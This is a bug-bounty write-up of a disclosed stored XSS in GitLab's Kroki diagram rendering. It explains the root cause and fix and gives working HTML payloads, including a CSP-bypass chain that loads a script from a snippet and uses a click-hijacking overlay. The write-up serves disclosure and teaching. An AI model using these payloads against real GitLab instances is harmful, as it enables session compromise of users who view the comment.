---
title: "Stored XSS via Kroki diagram"
slug: "stored-xss-via-kroki-diagram"
platform: "hackerone"
vuln_class: "Cross-site Scripting (XSS) - Stored"
difficulty: "medium"
scope_type: "web"
bounty: 13950
program: "GitLab"
reporter: "vakzz"
published_at: "2023-06-02"
source_url: "https://hackerone.com/reports/1731349"
tags: []
teaser: "A markdown diagram renderer silently executed attacker-controlled HTML by trusting user-supplied Kroki URLs without sanitization."
---

## The Program

GitLab is one of the most widely deployed DevOps platforms in the world, used by enterprises, governments, and open-source communities to host code, manage CI/CD pipelines, and collaborate on software. The company runs one of the more mature and well-funded bug bounty programs on HackerOne, with payouts that can reach well into five figures for critical and high-severity findings. This particular report earned $13,950 — a strong signal of how seriously GitLab treats client-side code execution vulnerabilities.

GitLab's self-hosted ("omnibus") deployment model makes it an especially interesting target. Administrators can enable a wide range of optional integrations and features, each of which expands the attack surface considerably. One such feature is Kroki, a diagram rendering service that converts plain-text markup (Mermaid, WaveDrom, PlantUML, and others) into SVG images. Kroki must be explicitly enabled in the admin panel, which means it is opt-in — but once enabled, it is available to any user who can post Markdown.

The intersection of Markdown parsing, server-side content transformation, and dynamic HTML generation is historically fertile ground for XSS. Wherever user-controlled text passes through a rendering pipeline that ultimately produces HTML, attribute injection is worth probing. Kroki's pipeline — from Markdown code fence to `<img>` tag — represents exactly that kind of surface.

---

## The Recon

The starting point is the Kroki filter source code, which is publicly available in the GitLab repository. Reading `lib/banzai/filter/kroki_filter.rb` reveals how GitLab converts a fenced code block into a diagram image. The filter scans parsed HTML for two CSS selector patterns: `pre[lang="#{diagram_type}"] > code` and `pre > code[lang="#{diagram_type}"]`. These selectors are used to locate valid diagram blocks — either the `pre` element or the `code` element can carry the `lang` attribute naming a supported diagram type like `wavedrom` or `mermaid`.

The critical observation comes from tracing what happens *after* the selector match. The code retrieves the diagram type with `node.parent['lang'] || node['lang']` — meaning it prefers the `lang` attribute on the parent `pre` element over the one on the `code` element. This creates a logical split: the selector can match because the `code` element has a valid `lang`, but the type that gets used downstream is taken from the `pre` element, which could hold an arbitrary string.

Following the data flow further, `diagram_type` is concatenated directly into a string to form an `<img>` tag: `%(<img src="#{image_src}" />)`. No sanitization, no escaping, no use of Rails' `content_tag` helper — just raw string interpolation. At this point the shape of the vulnerability is clear: control `diagram_type`, control the `img` tag's raw HTML. Browser developer tools and a local GitLab instance are sufficient to confirm the hypothesis — no fuzzing framework needed, just careful code reading and a test payload.

The Kroki feature is toggled at `/admin/application_settings/general`, and the rendered output can be observed in any Markdown preview: issues, merge requests, comments, and wiki pages. Each of these is a potential injection point, meaning the blast radius of any working payload covers nearly every collaborative surface in GitLab.

---

## The "Wait a Second..." Moment

The realization crystallizes when looking at this line: `diagram_type = node.parent['lang'] || node['lang']`. The CSS selector matches on the *child* `code` node's `lang`, but the value extracted for downstream use comes from the *parent* `pre` node. These two reads are inconsistent — and inconsistency in attribute resolution is exactly the kind of logic gap that produces injection vulnerabilities. If the `pre` element's `lang` is never validated against the list of supported diagram types (because validation already happened via the selector match on the child), then it can be set to anything, including a string containing a double quote and additional HTML attributes.

Constructing the mental model of the resulting `img` tag makes the impact immediately concrete. A `pre` with `lang='f/" onerror=alert(1) '` would produce `<img src=".../f/" onerror=alert(1) ..." />`. The double quote closes the `src` attribute, and everything that follows becomes additional attributes on the `img` element. Stored in a GitLab issue or comment, this payload fires for every user who loads the page — textbook stored XSS, persisted in the database, no interaction required beyond a page view.

---

## The Exploit

**Basic proof-of-concept (no CSP):**

The simplest payload to confirm the injection works on a GitLab instance without Content Security Policy enabled. Post the following as raw HTML in an issue description or comment:

```html
<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
```

When the page loads, the Kroki filter matches the `code[lang="wavedrom"]` selector, reads `lang` from the parent `pre`, and builds the `img` tag. The resulting HTML in the DOM becomes:

```html
<img src=".../f/" onerror="alert(1)" onload="alert(1)" class="js-render-kroki" ... />
```

An alert dialog appears immediately on page load.

**CSP bypass (full exploitation):**

GitLab's CSP blocks inline event handlers like `onerror`, so a more sophisticated chain is required for production instances. The technique exploits `data-diff-for-path`, a data attribute consumed by `single_file_diff.js`. When a diff "expand" chevron is clicked, the script performs an `axios.get` to the path stored in `data-diff-for-path`, then passes the response's `data.html` value directly to jQuery's `$()` constructor — which executes any `<script>` tags present in the HTML string.

Step 1 — Create a public snippet on the same GitLab instance containing a file named `aaa.json` with the following content:

```json
{"html":"<script>alert(document.domain)<\/script>"}
```

Note the raw URL of the snippet (e.g., `/root/project/-/snippets/9/raw/main/aaa.json`).

Step 2 — Navigate to any commit in a project. Add a line comment using this payload, substituting the correct `data-diff-for-path` value:

```html
<a>
    <pre lang='/" data-diff-for-path=/root/project/-/snippets/9/raw/main/aaa.json '>
        <code lang="wavedrom">csp</code>
    </pre>
    <pre
        lang='/" id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;" data-triggers="click" data-toggle=popover data-html=true data-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb" data-content=ggg '>
        <code lang="wavedrom">bypass</code>
    </pre>
</a>
```

Step 3 — The first injected `pre` sets `data-diff-for-path` on the rendered `img` to the attacker-controlled JSON URL. The second injected `pre` uses `style` to overlay a large invisible element covering the entire viewport, combined with Bootstrap popover attributes (`data-toggle=popover`) to inject CSS on first click. That CSS repositions the diff expand chevron (`.chevron-right`) to also cover the entire viewport. A second click triggers the chevron's click handler, which loads the JSON payload and passes it to `$(data.html)`, executing the script despite CSP.

Successful exploitation results in arbitrary JavaScript executing in the context of the GitLab origin (`document.domain` confirms this). Any victim who views the comment and clicks anywhere on the page twice has their session silently compromised.

---

## The Report

A well-written report for this class of vulnerability leads with a precise, non-generic title. "Stored XSS via attribute injection in Kroki diagram filter" communicates the storage mechanism, the injection vector, and the affected feature — a triager can immediately route it without reading the body.

Severity justification should reference both the CVSS score and the narrative reason. This finding scored CVSS 8.7 (High) because stored XSS is persistent and requires no attacker interaction after planting the payload. The impact section should articulate the worst-case scenario concretely: session token theft, account takeover, exfiltration of private repository contents, or lateral movement within an enterprise GitLab deployment.

Reproduction steps must be self-contained. A good report for this bug specifies the exact GitLab version tested, the admin configuration prerequisite (Kroki enabled), the exact payload string with no placeholders, and the expected observable outcome at each step. Including two separate reproduction paths — one without CSP and one with — demonstrates depth and covers the realistic production case. Screenshots or screen recordings of the alert firing are not strictly required but dramatically reduce triage time.

The root cause section is what distinguishes high-quality reports: pointing directly to the inconsistent attribute resolution logic (`node.parent['lang'] || node['lang']`) and the unsafe string interpolation rather than describing only the symptom. Proposing the correct fix — validate `diagram_type` against the known-good list before use, and construct the `img` tag with `content_tag` rather than string concatenation — signals that the reporter understands the underlying issue and accelerates the fix cycle. Reports that identify root causes rather than just symptoms tend to be triaged faster and rewarded more generously.

---

## The Takeaway

The core insight is that when two separate code paths read the same logical attribute from different DOM nodes, and only one of those paths enforces validation, the unvalidated path becomes an injection vector — a logic inconsistency rather than a missing escape.

Similar patterns appear anywhere a rendering pipeline maps structured input (code fences, macros, shortcodes) to HTML output through intermediate representations. Targets worth probing include any feature that transforms user-provided type identifiers, format strings, or category names into HTML attribute values — wiki rendering engines, documentation platforms, chat applications with Markdown support, and CMS preview systems. The attack surface expands significantly when the platform supports plugins or optional integrations, since each integration adds new code paths that may not receive the same security review as core features.

Useful tools for finding these bugs include reading open-source filter/transform code directly (as was done here), diffing rendered HTML against expected output using browser DevTools, and using Nokogiri or BeautifulSoup in a local script to trace how attribute values flow through a parsing pipeline. Variants of this pattern include CSS selector bypass via namespace manipulation, template injection in diagram type strings, and SSRF via diagram source URLs that accept arbitrary hostnames — all downstream consequences of trusting user-controlled identifiers without validation at the point of use.
